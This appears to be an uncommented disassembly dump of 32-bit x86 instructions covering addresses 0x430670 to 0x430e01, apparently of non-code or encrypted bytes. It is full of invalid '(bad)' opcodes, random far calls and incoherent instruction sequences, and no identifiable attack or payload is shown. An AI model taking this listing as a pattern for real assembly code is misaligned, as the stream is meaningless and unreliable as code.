  430670:	sbb    al,0xea
  430672:	and    DWORD PTR [eax-0x29b5bb53],esp
  430678:	jbe    0x430600
  43067a:	(bad)  
  43067b:	stc    
  43067c:	retf   
  43067d:	lock xchg edx,eax
  43067f:	shl    BYTE PTR [ebx],1
  430681:	mov    esi,0x56923277
  430686:	inc    esp
  430687:	mov    al,ds:0x9c5e069f
  43068c:	adc    BYTE PTR [eax],al
  43068e:	inc    eax
  43068f:	loope  0x4306bf
  430691:	ret    
  430692:	mov    dl,0xf8
  430694:	inc    esp
  430695:	loope  0x4306cc
  430697:	mov    ah,0x4e
  430699:	lahf   
  43069a:	mov    dl,0xed
  43069c:	scas   eax,DWORD PTR es:[edi]
  43069d:	mov    dh,0x36
  43069f:	mov    bh,0x25
  4306a1:	sar    BYTE PTR [edx+edi*1-0x59],0x48
  4306a6:	cmp    eax,DWORD PTR [ebx+ebx*1]
  4306a9:	cmp    al,0xe8
  4306ab:	pop    eax
  4306ac:	jle    0x4306d3
  4306ae:	sub    al,0xd4
  4306b0:	ss js  0x4306f4
  4306b3:	rol    DWORD PTR [eax],cl
  4306b5:	rcl    BYTE PTR [ecx+0x60],1
  4306b8:	pop    eax
  4306b9:	or     al,0xc
  4306bb:	mov    BYTE PTR [esi],0x69
  4306be:	pop    ebp
  4306bf:	inc    ebx
  4306c0:	call   0x3d09a519
  4306c5:	sub    BYTE PTR [eax],bh
  4306c7:	adc    al,0xd0
  4306c9:	adc    al,0x82
  4306cb:	push   ds
  4306cc:	mov    edx,0xaeabf64e
  4306d1:	sub    DWORD PTR [esi+esi*8],ebp
  4306d4:	push   ss
  4306d5:	cld    
  4306d6:	hlt    
  4306d7:	stos   BYTE PTR es:[edi],al
  4306d8:	cld    
  4306d9:	loope  0x4306b5
  4306db:	push   ecx
  4306dc:	add    al,0xe1
  4306de:	pop    ebx
  4306df:	and    al,0x2f
  4306e1:	dec    esp
  4306e2:	dec    eax
  4306e3:	push   0xf895fa68
  4306e8:	pushf  
  4306e9:	jb     0x4306eb
  4306eb:	je     0x430769
  4306ed:	ret    0xfe0
  4306f0:	push   ds
  4306f1:	pusha  
  4306f2:	xor    al,0x4a
  4306f4:	xchg   esp,eax
  4306f5:	(bad)  
  4306f6:	pop    esp
  4306f7:	sub    BYTE PTR [edx-0x45],0x1a
  4306fb:	stos   BYTE PTR es:[edi],al
  4306fc:	test   al,0xa8
  4306fe:	cwde   
  4306ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430700:	sahf   
  430701:	or     edi,edx
  430703:	push   0x10
  430705:	mov    dh,0xc1
  430707:	ror    BYTE PTR [edx-0xbf40750],0x22
  43070e:	sub    bl,BYTE PTR [edx-0x6b]
  430711:	ins    DWORD PTR es:[edi],dx
  430712:	mov    BYTE PTR [edx],bh
  430714:	or     edx,DWORD PTR [edx-0x5e]
  430717:	adc    eax,0x377c067c
  43071c:	inc    ecx
  43071d:	mov    ebx,0x9b9ebb0c
  430722:	and    bh,dh
  430724:	and    BYTE PTR [ebp+0x34380146],bh
  43072a:	jle    0x4306e0
  43072c:	or     DWORD PTR [edx],esi
  43072e:	pop    edx
  43072f:	mov    esp,0x50105415
  430734:	adc    cl,BYTE PTR [edx-0x57]
  430737:	cld    
  430738:	cmp    al,0x31
  43073a:	add    al,0x7b
  43073c:	sub    eax,0xcab247d6
  430741:	sub    BYTE PTR [eax-0x4a],0x59
  430745:	push   ebx
  430746:	fmul   QWORD PTR [esi-0xb05e906]
  43074c:	retf   0xa67c
  43074f:	jecxz  0x43077e
  430751:	ins    DWORD PTR es:[edi],dx
  430752:	push   0xbcc0ec68
  430757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430758:	repnz lock test BYTE PTR [ecx+0x70616858],dl
  430760:	sub    bh,bl
  430762:	mov    edx,0x3ecd8215
  430767:	cmp    al,0x1b
  430769:	sbb    eax,0x432df434
  43076e:	scas   al,BYTE PTR es:[edi]
  43076f:	pop    eax
  430770:	test   DWORD PTR [edx+0x2a124e5a],0x815a0b8e
  43077a:	or     DWORD PTR [edx+0x78],ebx
  43077d:	xor    al,0x10
  43077f:	adc    esi,eax
  430781:	loopne 0x430785
  430783:	pop    ss
  430784:	ss mov ah,0x66
  430787:	push   0x10
  430789:	stos   DWORD PTR es:[edi],eax
  43078a:	mov    esi,0xdb9f02f7
  43078f:	dec    eax
  430790:	pop    ebp
  430791:	pop    ebx
  430792:	push   ebp
  430793:	rcl    DWORD PTR [esi+0x5e],cl
  430796:	test   eax,0xd69a6d18
  43079b:	aas    
  43079c:	push   eax
  43079d:	inc    edi
  43079e:	and    DWORD PTR [ecx-0x60],0xdaaa1c60
  4307a5:	cmp    eax,0x8606c150
  4307aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4307ab:	ins    BYTE PTR es:[edi],dx
  4307ac:	ss pop edi
  4307ae:	sbb    BYTE PTR [ebx+0x45],al
  4307b1:	mov    dl,bh
  4307b3:	mov    fs:0x2fc262ac,al
  4307b9:	femms  
  4307bb:	stos   DWORD PTR es:[edi],eax
  4307bc:	mov    ebp,0x1e042ee0
  4307c1:	cmp    al,0x35
  4307c3:	add    BYTE PTR [eax],bl
  4307c5:	mov    eax,0xa3b5dc1b
  4307ca:	outs   dx,DWORD PTR ds:[esi]
  4307cb:	mov    ah,0x2a
  4307cd:	jo     0x430821
  4307cf:	push   0x1b
  4307d1:	cwde   
  4307d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4307d3:	mov    dl,0xef
  4307d5:	and    BYTE PTR [edi+0x6a],0x91
  4307d9:	les    edi,FWORD PTR [esi]
  4307db:	lods   al,BYTE PTR ds:[esi]
  4307dc:	out    dx,eax
  4307dd:	add    BYTE PTR [esi+eax*1],0xa2
  4307e1:	mov    dh,0x1
  4307e3:	mov    dh,0x38
  4307e5:	jl     0x430797
  4307e7:	vpaddusb ymm5,ymm1,YMMWORD PTR [esi-0x6]
  4307ec:	shl    DWORD PTR [esi+0x830c850],1
  4307f2:	dec    eax
  4307f3:	xchg   esi,eax
  4307f4:	cmp    al,BYTE PTR [ebx+ebx*4]
  4307f7:	lods   eax,DWORD PTR ds:[esi]
  4307f8:	xchg   esp,eax
  4307f9:	repnz test BYTE PTR [esp+edx*4-0x79],0xbb
  4307ff:	ror    BYTE PTR [esi+0x14],0xb0
  430803:	stos   DWORD PTR es:[edi],eax
  430804:	xor    eax,0x2f34d0db
  430809:	retf   0x549a
  43080c:	push   ss
  43080d:	test   eax,0x5dd2526e
  430812:	add    al,0x2a
  430814:	push   ds
  430815:	sbb    dh,al
  430817:	pop    esi
  430818:	push   0x3c
  43081a:	call   0x36a90a4
  43081f:	inc    eax
  430820:	test   al,0xfa
  430822:	test   al,0xe2
  430824:	or     BYTE PTR [eax+0x55],al
  430827:	repnz push 0x5053a4e8
  43082d:	push   0xd4b8da6a
  430832:	fsub   QWORD PTR [edx]
  430834:	rol    DWORD PTR [ebx],0x18
  430837:	pop    ebx
  430838:	or     BYTE PTR [edx-0x5c],dl
  43083b:	les    ebp,FWORD PTR [esi-0x735785d9]
  430841:	push   edi
  430842:	les    eax,FWORD PTR [esi]
  430844:	xor    bl,BYTE PTR [ebp+0x4b]
  430847:	mov    edx,0x2c568731
  43084c:	add    DWORD PTR [ecx-0x30],esi
  43084f:	mov    DWORD PTR [esi],0x6a108b84
  430855:	sub    ch,BYTE PTR [eax+0x4d]
  430858:	pop    esi
  430859:	jns    0x430819
  43085b:	add    eax,0x652eb284
  430860:	xchg   edi,eax
  430861:	ret    0x2c67
  430864:	xchg   edx,eax
  430865:	lock and ch,BYTE PTR [edx]
  430868:	or     al,0xce
  43086a:	jmp    0xdaa5:0x2e02d415
  430871:	repnz mov al,ds:0x56381930
  430877:	pop    es
  430878:	pop    eax
  430879:	push   es
  43087a:	scas   al,BYTE PTR es:[edi]
  43087b:	rcr    BYTE PTR [edx],cl
  43087d:	or     edi,DWORD PTR [ebx]
  43087f:	lods   al,BYTE PTR ds:[esi]
  430880:	xchg   esp,eax
  430881:	pop    ecx
  430882:	sbb    al,0xd8
  430884:	test   eax,0x15e8ee5e
  430889:	mov    ch,0x1
  43088b:	xor    ax,0x5c18
  43088f:	pop    ebx
  430890:	adc    ah,BYTE PTR [esp+edx*2]
  430893:	je     0x43089a
  430895:	push   eax
  430896:	ret    
  430897:	xor    dl,BYTE PTR [edx+0x6116a583]
  43089d:	sbb    BYTE PTR [edx+0x36],dl
  4308a0:	mov    ds:0x574122b5,eax
  4308a5:	pusha  
  4308a6:	or     dh,al
  4308a8:	mov    esi,0x98db2887
  4308ad:	sar    BYTE PTR [edx+ebp*4+0x1d9cef60],1
  4308b4:	call   0x8713fb9
  4308b9:	mov    esp,0xb60c5112
  4308be:	push   esp
  4308bf:	data16 sbb BYTE PTR [ecx+0x18],0xda
  4308c4:	jno    0x430926
  4308c6:	fimul  DWORD PTR [ebp+0x5a]
  4308c9:	inc    edi
  4308ca:	sbb    al,0x2
  4308cc:	cmp    cl,BYTE PTR [ecx]
  4308ce:	pop    ebp
  4308cf:	mov    cl,BYTE PTR [edi-0x54]
  4308d2:	stos   DWORD PTR es:[edi],eax
  4308d3:	jmp    0x4308f7
  4308d5:	add    edi,ecx
  4308d7:	adc    bh,cl
  4308d9:	add    al,0x99
  4308db:	add    BYTE PTR [ecx-0x4ffe1e7f],cl
  4308e1:	xchg   edx,eax
  4308e2:	sub    BYTE PTR [esi],dh
  4308e4:	(bad)  
  4308e5:	retf   
  4308e6:	inc    edx
  4308e7:	cmp    ah,bh
  4308e9:	mov    esi,0xd0ce6223
  4308ef:	push   cs
  4308f0:	cwde   
  4308f1:	jmp    0x45e8aa10
  4308f6:	push   cs
  4308f7:	inc    edx
  4308f8:	cld    
  4308f9:	push   cs
  4308fa:	fsub   st,st(4)
  4308fc:	shl    BYTE PTR [eax-0x7c],1
  4308ff:	mov    ?,WORD PTR [esi]
  430901:	mov    eax,0x352a806a
  430906:	add    esp,DWORD PTR [ecx]
  430908:	and    dl,0x14
  43090b:	lods   al,BYTE PTR ds:[esi]
  43090c:	dec    edx
  43090d:	das    
  43090e:	test   ch,cl
  430910:	mov    ch,0x4
  430912:	pop    eax
  430913:	fcomip st,st(2)
  430915:	xchg   esp,eax
  430916:	push   esp
  430917:	outs   dx,BYTE PTR ds:[esi]
  430918:	clc    
  430919:	(bad)  
  43091a:	std    
  43091b:	shl    BYTE PTR [edx+0x488e6556],1
  430921:	jae    0x4308ed
  430923:	pop    ebx
  430924:	push   esi
  430925:	mov    ah,0xd8
  430927:	xor    eax,0xfa576a02
  43092c:	popa   
  43092d:	mov    dl,0x4d
  43092f:	cwde   
  430930:	pop    esp
  430931:	jl     0x43098b
  430933:	clc    
  430934:	imul   esi,DWORD PTR [esi-0x751320d8],0x56829745
  43093e:	cmp    dh,BYTE PTR [ecx-0x131469ee]
  430944:	push   edx
  430945:	mov    al,0x45
  430947:	push   cs
  430948:	add    esp,DWORD PTR [eax+0x6e]
  43094b:	xchg   ebx,eax
  43094c:	cmp    DWORD PTR [edx+ebp*4+0x68],0x10
  430951:	fdivr  DWORD PTR [eax+eiz*1]
  430954:	mov    dl,0xa
  430956:	stos   BYTE PTR es:[edi],al
  430957:	add    eax,0x202a0074
  43095c:	rcl    esp,0xdd
  43095f:	adc    al,0x2a
  430962:	ds (bad) 
  430964:	cmp    DWORD PTR [ebx+ecx*2-0x66],edi
  430968:	test   eax,0x6680a747
  43096d:	ss jl  0x4309b0
  430970:	sub    al,BYTE PTR [ecx]
  430972:	cmp    al,0x86
  430974:	pop    ds
  430975:	add    BYTE PTR [esi],dh
  430977:	mov    esi,0x80ae0cfd
  43097c:	pop    ds
  43097d:	xchg   BYTE PTR ds:0x58a0d84,al
  430983:	call   0x5bd0:0x84294cf8
  43098a:	mov    ch,0x89
  43098c:	pop    esp
  43098d:	push   esi
  43098e:	sub    BYTE PTR [eax+edx*4],cl
  430991:	add    BYTE PTR [esi-0x5efedb58],ch
  430997:	inc    esi
  430998:	ficom  WORD PTR [eax+0x44a8560a]
  43099e:	and    al,0xe2
  4309a0:	jnp    0x430997
  4309a2:	in     al,0x37
  4309a4:	cmp    eax,0x960ad082
  4309a9:	push   cs
  4309aa:	cs fcmovnbe st,st(0)
  4309ad:	sahf   
  4309ae:	xchg   ecx,eax
  4309af:	sbb    eax,0x52358754
  4309b4:	mov    eax,ds:0xe4f0616
  4309b9:	pop    ebx
  4309ba:	xchg   esi,eax
  4309bb:	cmp    dl,BYTE PTR [eax+0x60]
  4309be:	inc    eax
  4309bf:	ret    0x94cf
  4309c2:	iret   
  4309c3:	js     0x430a0d
  4309c5:	popa   
  4309c6:	mov    ebx,0x246a9e88
  4309cb:	jne    0x430a13
  4309cd:	xor    al,0xde
  4309cf:	dec    ebp
  4309d0:	add    DWORD PTR [ebp+0x26e410a0],esp
  4309d6:	mov    esi,0xe8ad482
  4309db:	and    dh,0x80
  4309de:	adc    al,0xc2
  4309e0:	pushf  
  4309e1:	inc    esi
  4309e2:	sub    eax,0xd15ac8f6
  4309e7:	or     dh,BYTE PTR [edx]
  4309e9:	sub    dh,ch
  4309eb:	adc    esp,DWORD PTR [eax+0x5b]
  4309ee:	jg     0x430a42
  4309f0:	inc    ebp
  4309f1:	lods   eax,DWORD PTR ds:[esi]
  4309f2:	jne    0x43098d
  4309f4:	dec    edi
  4309f5:	push   esi
  4309f6:	jecxz  0x430a1a
  4309f8:	(bad)  
  4309f9:	adc    ch,bl
  4309fb:	enter  0x34de,0x85
  4309ff:	pop    edx
  430a00:	mov    ds:0x4cdbdc1,eax
  430a05:	sbb    BYTE PTR [eax+0x6a],bl
  430a08:	and    dh,al
  430a0a:	mov    es,WORD PTR [edx]
  430a0c:	adc    al,0xf0
  430a0e:	xchg   ecx,eax
  430a0f:	mov    dl,0xf3
  430a11:	mov    ah,0x19
  430a13:	sbb    ah,BYTE PTR fs:[esi]
  430a16:	inc    ecx
  430a17:	xchg   edi,eax
  430a18:	mov    eax,0xaaac0296
  430a1d:	ins    DWORD PTR es:[edi],dx
  430a1e:	jo     0x4309e6
  430a20:	cwde   
  430a21:	pusha  
  430a22:	mov    dh,0xa
  430a24:	jge    0x430a3e
  430a26:	outs   dx,BYTE PTR ds:[esi]
  430a27:	call   0xa551e496
  430a2c:	(bad)  
  430a2d:	pusha  
  430a2e:	jo     0x430a14
  430a30:	fs mov cl,0x65
  430a33:	inc    ebp
  430a34:	mov    dh,0xe9
  430a36:	shl    esi,cl
  430a38:	or     BYTE PTR [esi+0x62],al
  430a3b:	jbe    0x430a8f
  430a3d:	mov    al,0x4c
  430a3f:	jo     0x430ab6
  430a41:	adc    al,0x34
  430a43:	shr    BYTE PTR [eax+0x802b45e],1
  430a49:	lods   eax,DWORD PTR ds:[esi]
  430a4a:	lods   eax,DWORD PTR ds:[esi]
  430a4b:	inc    eax
  430a4c:	loope  0x430a8e
  430a4e:	sbb    al,0xea
  430a50:	push   ebp
  430a51:	mov    esi,0xab08b4b6
  430a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430a57:	jno    0x430a1d
  430a59:	sar    DWORD PTR [edx-0x25],1
  430a5c:	and    al,0x4
  430a5e:	mov    esp,0x2c265106
  430a63:	inc    esp
  430a64:	or     al,0xc1
  430a66:	sbb    al,0x96
  430a68:	loopne 0x430a99
  430a6a:	ss ds dec esi
  430a6d:	add    BYTE PTR [ebx-0x72],ch
  430a70:	jle    0x430a48
  430a72:	and    dl,BYTE PTR [ecx+0x64]
  430a75:	mov    ds:0x16db02f0,al
  430a7a:	jl     0x430a3e
  430a7c:	test   al,0xb6
  430a7e:	push   0xe4ba1ef4
  430a83:	sahf   
  430a84:	mov    cs,WORD PTR [edi]
  430a86:	cmp    al,0xa0
  430a88:	into   
  430a89:	pop    esi
  430a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a8b:	mov    BYTE PTR [ecx-0x793b3016],al
  430a91:	xchg   BYTE PTR [ebp-0x76f70c68],ah
  430a97:	add    al,0x7a
  430a99:	loope  0x430a3e
  430a9b:	mov    ch,0x4e
  430a9d:	inc    edx
  430a9e:	dec    esp
  430a9f:	inc    ecx
  430aa0:	push   edx
  430aa1:	xchg   ebp,eax
  430aa2:	jl     0x430aef
  430aa4:	mov    WORD PTR [edi],ds
  430aa6:	jp     0x430ae9
  430aa8:	inc    esp
  430aa9:	xchg   esi,eax
  430aaa:	mov    esi,0xd1071ccc
  430aaf:	sbb    al,0xd6
  430ab1:	xor    eax,0xe2400dfa
  430ab6:	sub    al,0x40
  430ab8:	add    eax,0xf5a2d6a0
  430abd:	fs xchg esi,eax
  430abf:	and    al,0xf9
  430ac1:	(bad)  
  430ac2:	aam    0xac
  430ac4:	std    
  430ac5:	mov    dl,0x51
  430ac7:	sbb    ebp,DWORD PTR [esi]
  430ac9:	adc    cl,dl
  430acb:	cli    
  430acc:	call   0x3744:0x862e8ac4
  430ad3:	mov    DWORD PTR [ebx+0x5c],esp
  430ad6:	nop
  430ad7:	call   0x6924:0x40db0a8
  430ade:	push   0x34
  430ae0:	call   0x28d9:0xa3a281dd
  430ae7:	imul   esi,eax,0xfffffffe
  430aea:	mov    eax,0xdd1a0378
  430aef:	inc    edx
  430af0:	xor    DWORD PTR [eax-0x9],0xffffff9a
  430af4:	inc    eax
  430af5:	xchg   DWORD PTR [ebp+0x231e0382],eax
  430afb:	inc    esp
  430afc:	shr    DWORD PTR [eax-0x63],0xf5
  430b00:	dec    edx
  430b01:	sbb    al,BYTE PTR [ecx+0x4212c81c]
  430b07:	xor    eax,edx
  430b09:	and    bl,BYTE PTR [eax]
  430b0b:	mov    dh,0x31
  430b0d:	jmp    0x430b09
  430b0f:	xor    cl,dh
  430b11:	mov    ?,eax
  430b13:	pop    edi
  430b14:	cs (bad) 
  430b16:	bound  ecx,QWORD PTR [edx]
  430b18:	mov    dl,0x1
  430b1a:	mov    cl,BYTE PTR [edx+0x44fa275a]
  430b20:	inc    esp
  430b21:	cs xchg edx,eax
  430b23:	mov    ds:0x2fa0aabe,al
  430b28:	push   0x21cc4826
  430b2d:	les    ecx,FWORD PTR [eax]
  430b2f:	cs repz mov dh,0xc1
  430b33:	pop    esi
  430b34:	cmp    BYTE PTR [edx+0xed7cee],0xd
  430b3b:	xor    al,0xaa
  430b3d:	(bad)
  430b40:	les    edx,FWORD PTR [eax]
  430b42:	adc    al,0x9e
  430b44:	retf   0x913
  430b47:	scas   eax,DWORD PTR es:[edi]
  430b48:	inc    esp
  430b49:	ins    BYTE PTR es:[edi],dx
  430b4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430b4b:	mov    bl,0x33
  430b4d:	dec    eax
  430b4e:	mov    cl,0x4a
  430b50:	test   BYTE PTR [ecx-0x30],0x3
  430b54:	pop    esi
  430b55:	push   eax
  430b56:	arpl   dx,si
  430b58:	gs jle 0x430b65
  430b5b:	sub    BYTE PTR [eax],0x40
  430b5e:	imul   esp,edx,0xffffffd6
  430b61:	pop    eax
  430b62:	fcomp  DWORD PTR [ebx+edx*8]
  430b65:	fcomi  st,st(4)
  430b67:	popa   
  430b68:	adc    eax,0x8be2ef16
  430b6d:	push   edx
  430b6e:	sti    
  430b6f:	rcr    BYTE PTR es:[ecx+0x33],1
  430b73:	test   BYTE PTR [edx],ch
  430b75:	ins    BYTE PTR es:[edi],dx
  430b76:	pop    es
  430b77:	loop   0x430bd3
  430b79:	fs jge 0x430b9e
  430b7c:	aam    0x61
  430b7e:	fs or  al,0x70
  430b81:	imul   esp,esi,0xffffffd1
  430b84:	mov    ch,BYTE PTR [esi]
  430b86:	add    al,0xec
  430b88:	inc    ebp
  430b89:	cwde   
  430b8a:	das    
  430b8b:	and    bl,BYTE PTR ds:0x90a6b515
  430b91:	dec    eax
  430b92:	pop    eax
  430b93:	mov    eax,0x689223ee
  430b98:	cmp    DWORD PTR [eax+0x14],ebp
  430b9b:	adc    al,0x5c
  430b9d:	adc    bh,ah
  430b9f:	test   BYTE PTR [eax],ch
  430ba1:	rol    BYTE PTR [edi+0x11f62054],cl
  430ba7:	dec    esi
  430ba8:	xor    DWORD PTR [eax],eax
  430baa:	fld    QWORD PTR [edx-0x763583ec]
  430bb0:	test   eax,0xf8e81
  430bb5:	jle    0x430bff
  430bb7:	fld    DWORD PTR [ecx+edx*8-0x41574fa4]
  430bbe:	pop    ecx
  430bbf:	push   eax
  430bc0:	add    DWORD PTR [ebx-0x64],ecx
  430bc3:	jg     0x430bc5
  430bc5:	mov    WORD PTR ds:0x322880e0,cs
  430bcb:	ins    BYTE PTR es:[edi],dx
  430bcc:	inc    esp
  430bcd:	cld    
  430bce:	(bad)  
  430bd0:	and    DWORD PTR [eax+0x40ca9406],eax
  430bd6:	mov    dh,0x98
  430bd8:	pop    es
  430bd9:	add    ch,BYTE PTR [ebp-0x6f]
  430bdc:	pop    edx
  430bdd:	fcmovu st,st(4)
  430bdf:	out    0x22,eax
  430be1:	push   ebx
  430be2:	jb     0x430b6c
  430be4:	or     dl,BYTE PTR [ecx+0x52acdf80]
  430bea:	bnd jmp 0x430bc7
  430bed:	inc    esp
  430bee:	adc    eax,0x11ab28e
  430bf3:	add    eax,0x9ea0b66d
  430bf8:	adc    DWORD PTR [eax+0x33],ecx
  430bfb:	fs (bad) 
  430bfd:	out    dx,al
  430bfe:	repnz sub esi,DWORD PTR [ecx+eiz*8+0x4d2af852]
  430c06:	mov    ebx,0x3abc3bba
  430c0b:	push   edx
  430c0c:	test   BYTE PTR [esi],al
  430c0e:	add    al,0xaf
  430c10:	cmp    al,0xea
  430c12:	jno    0x430bd4
  430c14:	call   0xa242:0xb4d404b
  430c1b:	ror    BYTE PTR [edx],0x49
  430c1e:	hlt    
  430c1f:	or     dl,BYTE PTR [edi+0x26]
  430c22:	ficom  DWORD PTR [eax+0x57]
  430c25:	push   ss
  430c26:	jmp    DWORD PTR [eax-0x4c93f598]
  430c2c:	sub    dh,BYTE PTR [eax]
  430c2e:	gs mov dl,0x2e
  430c31:	dec    ebx
  430c32:	mov    al,ds:0xdf2dba70
  430c37:	pusha  
  430c38:	or     ecx,DWORD PTR [edx]
  430c3a:	xor    BYTE PTR [edx],ch
  430c3c:	data16 aaa 
  430c3e:	in     al,dx
  430c3f:	lods   al,BYTE PTR ds:[esi]
  430c40:	mov    dh,0xe7
  430c42:	hlt    
  430c43:	add    BYTE PTR [edx+ebx*2+0x4],bl
  430c47:	scas   eax,DWORD PTR es:[edi]
  430c48:	add    eax,0xe46c8134
  430c4d:	or     DWORD PTR [eax],eax
  430c4f:	fiadd  DWORD PTR [edi+0x12]
  430c52:	sub    esp,DWORD PTR [esi-0x7967b4bb]
  430c58:	and    BYTE PTR [ecx+ebp*4+0x15],ah
  430c5c:	dec    ebp
  430c5d:	ins    BYTE PTR es:[edi],dx
  430c5e:	ret    
  430c5f:	inc    esi
  430c60:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430c62:	xor    BYTE PTR [esi+0x6e],0xcd
  430c66:	or     eax,0x8a13ad2f
  430c6b:	and    ecx,DWORD PTR [eax]
  430c6d:	out    0x8a,al
  430c6f:	add    BYTE PTR [edx],bh
  430c71:	ins    DWORD PTR es:[edi],dx
  430c72:	test   edx,ebx
  430c74:	jo     0x430c90
  430c76:	int3   
  430c77:	push   esp
  430c78:	call   0x43886cea
  430c7d:	adc    bh,BYTE PTR [esi]
  430c7f:	jp     0x430c21
  430c81:	cld    
  430c82:	jl     0x430c86
  430c84:	ss fdiv st,st(6)
  430c87:	mov    bl,BYTE PTR [edi+0x647495b8]
  430c8d:	outs   dx,BYTE PTR ds:[esi]
  430c8e:	push   ecx
  430c8f:	add    DWORD PTR [eax-0x5b],edi
  430c92:	or     eax,0x62527647
  430c97:	cmp    al,0xf0
  430c99:	push   es
  430c9a:	(bad)  
  430c9b:	rcl    BYTE PTR ds:0x44135d74,cl
  430ca1:	(bad)  
  430ca2:	into   
  430ca3:	aas    
  430ca4:	shl    BYTE PTR [ecx*2+0x5676c24a],cl
  430cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430cac:	stos   BYTE PTR es:[edi],al
  430cad:	cmp    cl,BYTE PTR [esi]
  430caf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430cb0:	loop   0x430c59
  430cb2:	mov    WORD PTR ds:0x3c1f2405,es
  430cb8:	jo     0x430ce9
  430cba:	mov    ch,BYTE PTR [ebx]
  430cbc:	add    DWORD PTR [ebp-0x2c],edx
  430cbf:	(bad)  
  430cc0:	mov    dh,0xc1
  430cc2:	push   cs
  430cc3:	sub    eax,0xebae8da8
  430cc8:	inc    BYTE PTR [ecx-0x70]
  430ccb:	push   ebp
  430ccc:	xlat   BYTE PTR ds:[ebx]
  430ccd:	pop    ss
  430cce:	aad    0x5e
  430cd0:	in     al,0x52
  430cd2:	aaa    
  430cd3:	repnz in al,dx
  430cd5:	push   ds
  430cd6:	mov    DWORD PTR [ebx+0x41],0x323a9b5b
  430cdd:	(bad)  
  430cde:	adc    al,0x62
  430ce0:	popf   
  430ce1:	jle    0x430c68
  430ce3:	mov    BYTE PTR [edi],cl
  430ce5:	push   edx
  430ce6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  430ce8:	and    bl,bl
  430cea:	jl     0x430d46
  430cec:	lock ins BYTE PTR es:[edi],dx
  430cee:	jecxz  0x430d2d
  430cf0:	jno    0x430d3c
  430cf2:	xchg   ebp,eax
  430cf3:	or     al,0xcc
  430cf5:	add    al,ah
  430cf7:	fwait
  430cf8:	pop    ecx
  430cf9:	in     eax,0x80
  430cfb:	ss or  al,0xb8
  430cfe:	fadd   st(0),st
  430d00:	call   0xdcd4:0xd8da9400
  430d07:	rcl    al,0x54
  430d0a:	push   0x60
  430d0c:	xor    al,BYTE PTR [ebp-0x59e1fd69]
  430d12:	inc    edi
  430d13:	ins    BYTE PTR es:[edi],dx
  430d14:	cli    
  430d15:	xor    BYTE PTR [ecx+0x5b],dh
  430d18:	imul   ecx,DWORD PTR [ebx],0xffffffae
  430d1b:	aam    0x63
  430d1d:	jmp    0x3722:0xbdd0b2e4
  430d24:	cli    
  430d25:	add    BYTE PTR [eax],0xae
  430d28:	inc    esp
  430d29:	mov    esp,0x5b8df9
  430d2e:	pop    esp
  430d2f:	pushf  
  430d30:	fld    DWORD PTR [eax]
  430d32:	test   al,0x53
  430d34:	int3   
  430d35:	mov    ebx,0xd8cf84b5
  430d3a:	mov    al,BYTE PTR cs:[edi+0x749594ae]
  430d41:	sar    BYTE PTR [ebx+eax*2-0x3f],1
  430d45:	sub    dh,dh
  430d47:	push   es
  430d48:	and    dh,BYTE PTR ds:[ebp+0x0]
  430d4c:	(bad)  
  430d4d:	adc    BYTE PTR [edx+0x20bd053f],cl
  430d53:	push   esi
  430d54:	push   edi
  430d55:	mov    cs,WORD PTR [ecx+esi*2-0x12baf228]
  430d5c:	push   edx
  430d5d:	repnz cdq 
  430d5f:	or     ch,BYTE PTR [esi+0x5c]
  430d62:	not    BYTE PTR [edx+0x7a113e44]
  430d68:	lods   al,BYTE PTR ds:[esi]
  430d69:	push   0x60
  430d6b:	jnp    0x430d47
  430d6d:	xchg   esp,eax
  430d6e:	cmp    BYTE PTR [eax-0x7c],ah
  430d71:	mov    es,WORD PTR [edi+0x0]
  430d74:	cmp    ah,cl
  430d76:	xchg   ebx,eax
  430d77:	jb     0x430ddc
  430d79:	imul   ebp,DWORD PTR [edx-0x3f],0x35
  430d7d:	cld    
  430d7e:	dec    ecx
  430d7f:	test   BYTE PTR [eax],ah
  430d81:	mov    BYTE PTR [ebp+edx*2-0x3e3fee03],al
  430d88:	cmp    BYTE PTR [eax],bl
  430d8a:	in     al,0x92
  430d8c:	add    cl,dh
  430d8e:	(bad)  
  430d8f:	dec    eax
  430d90:	dec    eax
  430d91:	push   eax
  430d92:	mov    ch,0x75
  430d94:	or     ch,al
  430d96:	cmp    bl,BYTE PTR [edi]
  430d98:	lods   eax,DWORD PTR ds:[esi]
  430d99:	mov    ds:0x68d8a203,al
  430d9e:	mov    dh,0xa0
  430da0:	enter  0x5ad7,0x68
  430da4:	push   0x75318eca
  430da9:	push   eax
  430daa:	push   0x9c286a52
  430daf:	fsubr  DWORD PTR [esi]
  430db1:	mul    BYTE PTR [edx-0x20]
  430db4:	dec    ecx
  430db5:	or     al,0x20
  430db7:	inc    esi
  430db8:	ins    DWORD PTR es:[edi],dx
  430db9:	add    BYTE PTR [eax+0x46],bl
  430dbc:	pop    es
  430dbd:	test   dl,bl
  430dbf:	or     ch,0x30
  430dc2:	ins    BYTE PTR es:[edi],dx
  430dc3:	xor    edx,ecx
  430dc5:	loope  0x430e33
  430dc7:	cmp    dh,al
  430dc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430dca:	data16 or BYTE PTR [edx],ah
  430dcd:	sbb    BYTE PTR [eax+0x31424214],cl
  430dd3:	ficom  WORD PTR [esi+edx*2]
  430dd6:	inc    edx
  430dd7:	add    BYTE PTR [edx+edi*1+0xb],bh
  430ddb:	mov    al,ds:0x2cc21d6d
  430de0:	xchg   esp,eax
  430de1:	imul   ebx,DWORD PTR [edi+edi*8],0x2f
  430de5:	fmul   QWORD PTR [edi+0xa]
  430de8:	mov    dh,0x8a
  430dea:	sub    ecx,DWORD PTR [eax]
  430dec:	mov    eax,DWORD PTR [edx-0x1a1da167]
  430df2:	pop    edx
  430df3:	push   ebx
  430df4:	add    eax,0x58d034fc
  430df9:	int    0x22
  430dfb:	(bad)  
  430dfc:	cli    
  430dfd:	icebp  
  430dfe:	fld    TBYTE PTR [edx-0x71]
  430e01:	repnz mov ah,0x7b
